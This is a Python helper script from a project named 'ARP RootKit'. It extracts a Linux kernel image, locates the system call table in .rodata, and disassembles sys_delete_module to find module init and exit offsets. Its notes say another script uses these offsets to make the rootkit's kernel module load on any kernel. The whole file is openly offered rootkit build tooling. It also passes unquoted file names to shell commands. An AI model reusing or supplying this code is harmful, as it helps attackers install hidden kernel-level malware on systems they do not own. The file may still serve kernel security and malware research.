#    _  __  __     __                       
#   /_) )_) )_)    )_) _   _  _)_ )_/ o _)_ 
#  / / / \ /      / \ (_) (_) (_ /  ) ( (_  
#
## License
#
# Copyright (c) 2018 Abel Romero Pérez aka D1W0U <abel@abelromero.com>
#
# This file is part of ARP RootKit.
#
# ARP RootKit is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# ARP RootKit is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with ARP RootKit.  If not, see <http://www.gnu.org/licenses/>.
#
## Notes
#
# This finds the offsets to init and exit in the struct module defined
# in a vmlinuz image.
# Is used by patch-lkm.py to make the .ko loadable in any kernel.
#

import subprocess
import sys
import os
import re
import struct
from capstone_python import *
from capstone_python.x86 import *

__NR_delete_module = 176

def get_text_offsets(vmlinux):
	out = subprocess.check_output(["readelf", "-t", "--wide", vmlinux])
	#.text
	#   PROGBITS        ffffffff81000000 200000 c031d1
	pattern = "\.text\n\s*?PROGBITS\s*?([a-z0-9]{16}) \d+ ([a-z0-9]{0,16}?) "
	regex = re.compile(pattern)
	out = out.decode('utf-8')
	match = regex.findall(out)
	code_start = int(match[0][0], 16)
	code_end = code_start + int(match[0][1], 16)
	return (code_start, code_end)

def find_sct(vmlinux, code_start, code_end):
	secdata = vmlinux + ".data"
	cmd = "objcopy --dump-section .rodata=" + secdata + " " + vmlinux
	if os.system(cmd):
		os.remove(secdata)
		return -1
	f = open(secdata, 'rb')
	c = 0
	sct = []
	while True:
		data = f.read(8)
		if data == '' or len(data) < 8:
			break
		data = struct.unpack("=Q", data)
		data = data[0] 
		if data >= code_start and data <= code_end:
			c += 1
			sct.append(data)
			#if (c >= 500):
			#	print("%d found sct!" % c)
		else:
			if c > 500 and c < 600:
				print("Found sct! %d syscalls" % c)
				break
			c = 0
			sct = []
	f.close()
	os.remove(secdata)
	return sct

def find_rela_offsets(vmlinux):
	(code_start, code_end) = get_text_offsets(vmlinux)
	sct = find_sct(vmlinux, code_start, code_end)
	off = sct[__NR_delete_module] - code_start
	print ("sys_delete_module at offset .text+0x%x" % off)
	seccode = vmlinux + ".code"
	cmd = "objcopy --dump-section .text=" + seccode + " " + vmlinux
	if os.system(cmd):
		os.remove(vmlinux)
		sys.exit(-1)
	f = open(seccode, "rb")
	f.seek(off, os.SEEK_SET)
	code = f.read(500)
	f.close()
	md = Cs(CS_ARCH_X86, CS_MODE_64)
	md.syntax = CS_OPT_SYNTAX_ATT
	insts = ""
	for i in md.disasm(code, off):
		insts += i.mnemonic + "\t" + i.op_str + "\n"
		#print (inst)
		#print("0x%x:\t%s\t%s" %(i.address, i.mnemonic, i.op_str))
	print (insts)
	pattern = "cmpq\s+?\$0, (\S+)?\(.*?\)\n[\s\S]+?je\s*?.*?\ncmpq\s+?\$0, (\S+?)?\(.*?\)\n"
	regex = re.compile(pattern)
	match = regex.findall(insts)
	#print (match)
	init = int(match[0][0], 16)
	exit = int(match[0][1], 16)
	os.remove(seccode)
	return init, exit

if __name__ == "__main__":
	if len(sys.argv) < 2:
		print ("use: %s <vmlinuz>" % sys.argv[0])
		sys.exit(-1)

	vmlinuz = sys.argv[1]
	vmlinux = "vmlinux"
	cmd = "./extract-vmlinux " + vmlinuz + " > " + vmlinux + " 2>/dev/null"
	if os.system(cmd):
	    sys.exit(-1)

	init, exit = find_rela_offsets(vmlinux)
	print ("init = %d\nexit = %d" % (init, exit))

	os.remove(vmlinux)
